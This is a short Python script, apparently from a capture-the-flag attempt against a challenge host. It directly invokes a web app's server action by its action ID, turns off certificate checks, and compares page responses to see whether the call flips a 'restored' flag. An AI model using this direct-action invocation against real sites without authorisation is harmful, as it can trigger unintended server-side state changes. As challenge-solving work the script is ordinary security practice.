#!/usr/bin/env python3
"""
Use a persistent cookie jar to call the action and then GET, and check for
'restored':true.
"""
import urllib.request, urllib.error, ssl, http.cookiejar, hashlib

URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=ctx),
    urllib.request.HTTPCookieProcessor(jar),
)


def req(method, url, headers=None, body=None):
    r = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X1234ABC"
    parts = []
    for k, v in fields:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        parts.append(v.encode() if isinstance(v, str) else v)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


# 1. GET to seed cookie
s, h, d = req("GET", URL)
print("Cookie:", [c.name + "=" + c.value[:8] for c in jar])
print("init restored:", b'"restored":false' in d, b'"restored":true' in d)
print("init hash:", hashlib.sha256(d).hexdigest()[:12], len(d))

# 2. Call MPA
boundary, body = multipart([(f"$ACTION_ID_{ACTION_ID}", "")])
s, h, d = req("POST", URL, {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
print("\nMPA status:", s, "len:", len(d), "hash:", hashlib.sha256(d).hexdigest()[:12])
print("MPA restored:", b'"restored":false' in d, b'"restored":true' in d)

# 3. Subsequent GET (same cookie)
s, h, d = req("GET", URL)
print("\nAfter GET status:", s, "len:", len(d), "hash:", hashlib.sha256(d).hexdigest()[:12])
print("After restored:", b'"restored":false' in d, b'"restored":true' in d)

# Search for any new content vs initial
init_get_again = req("GET", URL)
print("init_get_again equal to second GET?", init_get_again[2] == d)
